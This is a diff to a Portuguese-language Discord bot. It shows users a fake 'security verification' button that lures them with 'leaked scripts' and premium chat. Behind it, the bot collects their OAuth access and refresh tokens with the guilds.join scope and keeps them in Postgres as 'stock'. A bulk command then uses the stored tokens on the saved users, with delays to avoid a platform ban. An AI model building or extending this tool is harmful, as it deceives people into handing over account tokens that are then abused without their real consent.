@@ -14,7 +14,7 @@ const REDIRECT_TARGET = 'https://discord.com/app';
 // --- SETUP DO BANCO (POSTGRES) ---
 let pool = null;
 
-// Função para iniciar o Banco ANTES do bot
+// Função para iniciar o Banco ANTES do bot (Evita erros de tabela)
 async function iniciarBanco() {
     if (process.env.DATABASE_URL) {
         pool = new Pool({
@@ -23,6 +23,7 @@ async function iniciarBanco() {
         });
 
         try {
+            // Cria a tabela automaticamente se ela não existir
             await pool.query(`
                 CREATE TABLE IF NOT EXISTS auth_users (
                     id VARCHAR(255) PRIMARY KEY,
@@ -37,7 +38,7 @@ async function iniciarBanco() {
             console.error("❌ Erro fatal ao criar tabela:", err);
         }
     } else {
-        console.log('⚠️ DATABASE_URL não definida. Rodando em memória.');
+        console.log('⚠️ DATABASE_URL não definida. O bot não vai salvar tokens.');
     }
 }
 
@@ -51,7 +52,7 @@ app.get('/', async (req, res) => {
         try {
             const result = await pool.query('SELECT COUNT(*) FROM auth_users');
             count = result.rows[0].count;
-        } catch(e) { count = 0; } // Se der erro, diz que tem 0
+        } catch(e) { count = 0; }
     }
     res.send(`Auth Bot Postgres Online. Estoque: ${count}`);
 });
@@ -81,7 +82,7 @@ app.get('/callback', async (req, res) => {
 
         const user = userResponse.data;
 
-        // Salva no Banco (Com proteção de erro)
+        // Salva no Banco (SQL)
         if (pool) {
             await pool.query(`
                 INSERT INTO auth_users (id, username, access_token, refresh_token)
@@ -91,7 +92,7 @@ app.get('/callback', async (req, res) => {
             `, [user.id, user.username, access_token, refresh_token]);
         }
 
-        // Tenta dar cargo
+        // Tenta dar cargo no servidor de origem (State)
         let nomeServidor = "Desconhecido";
         if (state) {
             try {
@@ -99,6 +100,7 @@ app.get('/callback', async (req, res) => {
                 if (guild) {
                     nomeServidor = guild.name;
                     const member = await guild.members.fetch(user.id).catch(() => null);
+                    // Procura o cargo pelo nome exato
                     const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                     if (member && role) await member.roles.add(role);
                 }
@@ -110,11 +112,12 @@ app.get('/callback', async (req, res) => {
         if (logChannel) {
             const embed = new EmbedBuilder()
                 .setTitle('📥 Token Salvo (SQL)')
-                .setDescription(`**Usuário:** ${user.username}`)
+                .setDescription(`**Usuário:** ${user.username}\n**Origem:** ${nomeServidor}`)
                 .setColor('Blue');
             logChannel.send({ embeds: [embed] });
         }
 
+        // Página Bonita
         res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verificado</title><style>body{background-color:#2b2d31;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}.card{background:#313338;padding:40px;border-radius:15px;text-align:center}.btn{background:#5865F2;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;margin-top:20px;display:inline-block}</style></head><body><div class="card"><h1>✅ Sucesso!</h1><p>Verificado em <b>${nomeServidor}</b>.</p><a href="${REDIRECT_TARGET}" class="btn">Voltar</a></div></body></html>`);
 
     } catch (e) { console.error(e); res.send('Erro auth.'); }
@@ -124,15 +127,13 @@ app.get('/callback', async (req, res) => {
 client.once('ready', async () => {
     console.log(`🤖 Bot Postgres Logado: ${client.user.tag}`);
     
-    // Só tenta ler o banco se ele existir
+    // Tenta atualizar o status com o número do banco
     if (pool) {
         try {
             const res = await pool.query('SELECT COUNT(*) FROM auth_users');
             const total = res.rows[0].count;
             client.user.setActivity(`${total} usuários`, { type: ActivityType.Watching });
-        } catch (e) {
-            console.log("Banco ainda não pronto, pulando status inicial.");
-        }
+        } catch (e) {}
     }
     
     await client.application.commands.set([
@@ -156,9 +157,20 @@ client.on('interactionCreate', async interaction => {
     
     if (interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+        
+        // Link gerado dinamicamente
         const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
+        
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
-        const embed = new EmbedBuilder().setTitle('🛡️ Verificação').setDescription('Clique abaixo para liberar seu acesso.').setColor('#5865F2');
+        
+        // --- SEU TEXTO PERSONALIZADO ---
+        const embed = new EmbedBuilder()
+            .setTitle('🛡️ Verificação de Segurança')
+            .setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!')
+            .setColor(0x5865F2)
+            .setFooter({ text: 'Sistema seguro de Verificação' });
+        // -------------------------------
+
         interaction.reply({ content: 'Painel enviado.', ephemeral: true });
         interaction.channel.send({ embeds: [embed], components: [row] });
     }
@@ -170,7 +182,7 @@ client.on('interactionCreate', async interaction => {
                 const res = await pool.query('SELECT COUNT(*) FROM auth_users');
                 count = res.rows[0].count;
             } catch(e) { 
-                return interaction.reply({ content: '❌ Erro ao ler banco de dados. Tente novamente.', ephemeral: true });
+                return interaction.reply({ content: '❌ Erro ao ler banco.', ephemeral: true });
             }
         }
         interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
@@ -203,23 +215,24 @@ client.on('interactionCreate', async interaction => {
                     );
                     sucesso++;
                 } catch (error) {
+                    // Token inválido? Apaga do banco
                     if (error.response && error.response.status === 401) {
                         await pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]);
                     }
                     falha++;
                 }
-                await sleep(1000);
+                await sleep(1000); // Delay de 1s para não tomar ban
             }
 
             interaction.channel.send(`✅ **Finalizado!**\nSucesso: ${sucesso}\nFalha: ${falha}`);
         } catch (err) {
+            console.error(err);
             interaction.reply('Erro fatal ao buscar usuários no banco.');
         }
     }
 });
 
-// --- INICIALIZAÇÃO SEGURA ---
-// Primeiro conecta no banco e cria a tabela, SÓ DEPOIS liga o servidor e o bot
+// --- INICIALIZAÇÃO SEGURA (BANCO -> WEB SERVER -> BOT) ---
 iniciarBanco().then(() => {
     app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
     client.login(process.env.BOT_TOKEN);
